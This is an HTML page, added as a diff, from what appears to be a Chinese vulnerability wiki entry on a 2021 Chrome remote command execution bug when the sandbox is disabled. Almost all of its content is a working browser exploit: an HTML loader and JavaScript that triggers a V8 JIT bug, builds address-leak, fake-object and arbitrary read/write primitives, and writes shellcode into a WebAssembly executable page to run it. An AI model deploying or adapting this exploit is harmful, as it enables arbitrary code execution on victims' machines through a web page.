@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E/Chrome/Chrome%20%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9C%AA%E5%BC%80%E5%90%AF%E6%B2%99%E7%AE%B1%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Chrome 浏览器未开启沙箱 远程命令执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Chrome \u6d4f\u89c8\u5668\u672a\u5f00\u542f\u6c99\u7bb1 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../ClickHouse/ClickHouse%20API%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8E%A5%E5%8F%A3%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../ClickHouse/ClickHouse%20API%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8E%A5%E5%8F%A3%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        ClickHouse API 数据库接口未授权访问漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E8%85%BE%E8%AE%AF%20%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%20agentinfo%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E8%85%BE%E8%AE%AF%20%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%20agentinfo%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        腾讯 企业微信 agentinfo 信息泄漏漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="chrome">Chrome 浏览器未开启沙箱 远程命令执行漏洞<a class="headerlink" href="#chrome" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>Windows Chrome 0day  在 2021-4-13 被公开</p>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p><a-checkbox checked>Window Chrome 浏览器</a-checkbox></br></p>
+<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p><a-alert type="success" message="Github： https://github.com/r4j0x00/exploits/tree/master/chrome-0day" description="" showIcon>
+</a-alert>
+<br/>
+<a-alert type="success" message="推特: https://twitter.com/r4j0x00/status/1381643526010597380?s=12" description="" showIcon>
+</a-alert>
+<br/></p>
+<div class="highlight"><pre><span></span><code>exp.html
+<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;exploit.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>exp.js
+/*
+/*
+BSD 2-Clause License
+Copyright (c) 2021, rajvardhan agarwal
+All rights reserved.
+Redistribution and use in source and binary forms, with or without
+modification, are permitted provided that the following conditions are met:
+1. Redistributions of source code must retain the above copyright notice, this
+   list of conditions and the following disclaimer.
+2. Redistributions in binary form must reproduce the above copyright notice,
+   this list of conditions and the following disclaimer in the documentation
+   and/or other materials provided with the distribution.
+THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS &quot;AS IS&quot;
+AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
+FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
+SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
+CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
+OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
+OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+*/
+
+var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
+var wasm_mod = new WebAssembly.Module(wasm_code);
+var wasm_instance = new WebAssembly.Instance(wasm_mod);
+var f = wasm_instance.exports.main;
+
+var buf = new ArrayBuffer(8);
+var f64_buf = new Float64Array(buf);
+var u64_buf = new Uint32Array(buf);
+let buf2 = new ArrayBuffer(0x150);
+
+function ftoi(val) {
+    f64_buf[0] = val;
+    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) <span class="err">&lt;</span><span class="p">&lt;</span> <span class="nt">32n</span><span class="err">);</span>
+<span class="err">}</span>
+
+<span class="na">function</span> <span class="na">itof</span><span class="err">(</span><span class="na">val</span><span class="err">)</span> <span class="err">{</span>
+    <span class="na">u64_buf</span><span class="err">[</span><span class="na">0</span><span class="err">]</span> <span class="err">=</span> <span class="na">Number</span><span class="err">(</span><span class="na">val</span> <span class="err">&amp;</span> <span class="na">0xffffffffn</span><span class="err">);</span>
+    <span class="na">u64_buf</span><span class="err">[</span><span class="na">1</span><span class="err">]</span> <span class="err">=</span> <span class="na">Number</span><span class="err">(</span><span class="na">val</span> <span class="p">&gt;</span>&gt; 32n);
+    return f64_buf[0];
+}
+
+const _arr = new Uint32Array([2**31]);
+
+function foo(a) {
+    var x = 1;
+    x = (_arr[0] ^ 0) + 1;
+
+    x = Math.abs(x);
+    x -= 2147483647;
+    x = Math.max(x, 0);
+
+    x -= 1;
+    if(x==-1) x = 0;
+
+    var arr = new Array(x);
+    arr.shift();
+    var cor = [1.1, 1.2, 1.3];
+
+    return [arr, cor];
+}
+
+for(var i=0;i<span class="p">&lt;</span><span class="nt">0x3000</span><span class="err">;++</span><span class="na">i</span><span class="err">)</span>
+    <span class="na">foo</span><span class="err">(</span><span class="na">true</span><span class="err">);</span>
+
+<span class="na">var</span> <span class="na">x </span><span class="o">=</span> <span class="s">foo(false);</span>
+<span class="na">var</span> <span class="na">arr </span><span class="o">=</span> <span class="s">x[0];</span>
+<span class="na">var</span> <span class="na">cor </span><span class="o">=</span> <span class="s">x[1];</span>
+
+<span class="na">const</span> <span class="na">idx </span><span class="o">=</span> <span class="s">6;</span>
+<span class="na">arr</span><span class="err">[</span><span class="na">idx</span><span class="err">+</span><span class="na">10</span><span class="err">]</span> <span class="err">=</span> <span class="na">0x4242</span><span class="err">;</span>
+
+<span class="na">function</span> <span class="na">addrof</span><span class="err">(</span><span class="na">k</span><span class="err">)</span> <span class="err">{</span>
+    <span class="na">arr</span><span class="err">[</span><span class="na">idx</span><span class="err">+</span><span class="na">1</span><span class="err">]</span> <span class="err">=</span> <span class="na">k</span><span class="err">;</span>
+    <span class="na">return</span> <span class="na">ftoi</span><span class="err">(</span><span class="na">cor</span><span class="err">[</span><span class="na">0</span><span class="err">])</span> <span class="err">&amp;</span> <span class="na">0xffffffffn</span><span class="err">;</span>
+<span class="err">}</span>
+
+<span class="na">function</span> <span class="na">fakeobj</span><span class="err">(</span><span class="na">k</span><span class="err">)</span> <span class="err">{</span>
+    <span class="na">cor</span><span class="err">[</span><span class="na">0</span><span class="err">]</span> <span class="err">=</span> <span class="na">itof</span><span class="err">(</span><span class="na">k</span><span class="err">);</span>
+    <span class="na">return</span> <span class="na">arr</span><span class="err">[</span><span class="na">idx</span><span class="err">+</span><span class="na">1</span><span class="err">];</span>
+<span class="err">}</span>
+
+<span class="na">var</span> <span class="na">float_array_map </span><span class="o">=</span> <span class="s">ftoi(cor[3]);</span>
+
+<span class="na">var</span> <span class="na">arr2 </span><span class="o">=</span> <span class="s">[itof(float_array_map),</span> <span class="na">1</span><span class="err">.</span><span class="na">2</span><span class="err">,</span> <span class="na">2</span><span class="err">.</span><span class="na">3</span><span class="err">,</span> <span class="na">3</span><span class="err">.</span><span class="na">4</span><span class="err">];</span>
+<span class="na">var</span> <span class="na">fake </span><span class="o">=</span> <span class="s">fakeobj(addrof(arr2)</span> <span class="err">+</span> <span class="na">0x20n</span><span class="err">);</span>
+
+<span class="na">function</span> <span class="na">arbread</span><span class="err">(</span><span class="na">addr</span><span class="err">)</span> <span class="err">{</span>
+    <span class="na">if</span> <span class="err">(</span><span class="na">addr</span> <span class="err">%</span> <span class="na">2n </span><span class="o">=</span><span class="s">=</span> <span class="na">0</span><span class="err">)</span> <span class="err">{</span>
+        <span class="na">addr</span> <span class="err">+=</span> <span class="na">1n</span><span class="err">;</span>
+    <span class="err">}</span>
+    <span class="na">arr2</span><span class="err">[</span><span class="na">1</span><span class="err">]</span> <span class="err">=</span> <span class="na">itof</span><span class="err">((</span><span class="na">2n</span> <span class="err">&lt;&lt;</span> <span class="na">32n</span><span class="err">)</span> <span class="err">+</span> <span class="na">addr</span> <span class="na">-</span> <span class="na">8n</span><span class="err">);</span>
+    <span class="na">return</span> <span class="err">(</span><span class="na">fake</span><span class="err">[</span><span class="na">0</span><span class="err">]);</span>
+<span class="err">}</span>
+
+<span class="na">function</span> <span class="na">arbwrite</span><span class="err">(</span><span class="na">addr</span><span class="err">,</span> <span class="na">val</span><span class="err">)</span> <span class="err">{</span>
+    <span class="na">if</span> <span class="err">(</span><span class="na">addr</span> <span class="err">%</span> <span class="na">2n </span><span class="o">=</span><span class="s">=</span> <span class="na">0</span><span class="err">)</span> <span class="err">{</span>
+        <span class="na">addr</span> <span class="err">+=</span> <span class="na">1n</span><span class="err">;</span>
+    <span class="err">}</span>
+    <span class="na">arr2</span><span class="err">[</span><span class="na">1</span><span class="err">]</span> <span class="err">=</span> <span class="na">itof</span><span class="err">((</span><span class="na">2n</span> <span class="err">&lt;&lt;</span> <span class="na">32n</span><span class="err">)</span> <span class="err">+</span> <span class="na">addr</span> <span class="na">-</span> <span class="na">8n</span><span class="err">);</span>
+    <span class="na">fake</span><span class="err">[</span><span class="na">0</span><span class="err">]</span> <span class="err">=</span> <span class="na">itof</span><span class="err">(</span><span class="na">BigInt</span><span class="err">(</span><span class="na">val</span><span class="err">));</span>
+<span class="err">}</span>
+
+<span class="na">function</span> <span class="na">copy_shellcode</span><span class="err">(</span><span class="na">addr</span><span class="err">,</span> <span class="na">shellcode</span><span class="err">)</span> <span class="err">{</span>
+    <span class="na">let</span> <span class="na">dataview </span><span class="o">=</span> <span class="s">new</span> <span class="na">DataView</span><span class="err">(</span><span class="na">buf2</span><span class="err">);</span>
+    <span class="na">let</span> <span class="na">buf_addr </span><span class="o">=</span> <span class="s">addrof(buf2);</span>
+    <span class="na">let</span> <span class="na">backing_store_addr </span><span class="o">=</span> <span class="s">buf_addr</span> <span class="err">+</span> <span class="na">0x14n</span><span class="err">;</span>
+    <span class="na">arbwrite</span><span class="err">(</span><span class="na">backing_store_addr</span><span class="err">,</span> <span class="na">addr</span><span class="err">);</span>
+
+    <span class="na">for</span> <span class="err">(</span><span class="na">let</span> <span class="na">i </span><span class="o">=</span> <span class="s">0;</span> <span class="na">i</span> <span class="err">&lt;</span> <span class="na">shellcode</span><span class="err">.</span><span class="na">length</span><span class="err">;</span> <span class="na">i</span><span class="err">++)</span> <span class="err">{</span>
+        <span class="na">dataview</span><span class="err">.</span><span class="na">setUint32</span><span class="err">(</span><span class="na">4</span><span class="err">*</span><span class="na">i</span><span class="err">,</span> <span class="na">shellcode</span><span class="err">[</span><span class="na">i</span><span class="err">],</span> <span class="na">true</span><span class="err">);</span>
+    <span class="err">}</span>
+<span class="err">}</span>
+
+<span class="na">var</span> <span class="na">rwx_page_addr </span><span class="o">=</span> <span class="s">ftoi(arbread(addrof(wasm_instance)</span> <span class="err">+</span> <span class="na">0x68n</span><span class="err">));</span>
+<span class="na">console</span><span class="err">.</span><span class="na">log</span><span class="err">(&quot;[+]</span> <span class="na">Address</span> <span class="na">of</span> <span class="na">rwx</span> <span class="na">page:</span> <span class="err">&quot;</span> <span class="err">+</span> <span class="na">rwx_page_addr</span><span class="err">.</span><span class="na">toString</span><span class="err">(</span><span class="na">16</span><span class="err">));</span>
+<span class="na">var</span> <span class="na">shellcode </span><span class="o">=</span> <span class="s">[3833809148,12642544,1363214336,1364348993,3526445142,1384859749,1384859744,1384859672,1921730592,3071232080,827148874,3224455369,2086747308,1092627458,1091422657,3991060737,1213284690,2334151307,21511234,2290125776,1207959552,1735704709,1355809096,1142442123,1226850443,1457770497,1103757128,1216885899,827184641,3224455369,3384885676,3238084877,4051034168,608961356,3510191368,1146673269,1227112587,1097256961,1145572491,1226588299,2336346113,21530628,1096303056,1515806296,1497454657,2202556993,1379999980,1096343807,2336774745,4283951378,1214119935,442,0,2374846464,257,2335291969,3590293359,2729832635,2797224278,4288527765,3296938197,2080783400,3774578698,1203438965,1785688595,2302761216,1674969050,778267745,6649957];</span>
+<span class="na">copy_shellcode</span><span class="err">(</span><span class="na">rwx_page_addr</span><span class="err">,</span> <span class="na">shellcode</span><span class="err">);</span>
+<span class="na">f</span><span class="err">();</span>
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../ClickHouse/ClickHouse%20API%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8E%A5%E5%8F%A3%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../ClickHouse/ClickHouse%20API%20%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8E%A5%E5%8F%A3%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        ClickHouse API 数据库接口未授权访问漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E8%85%BE%E8%AE%AF%20%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%20agentinfo%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E8%85%BE%E8%AE%AF%20%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%20agentinfo%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        腾讯 企业微信 agentinfo 信息泄漏漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
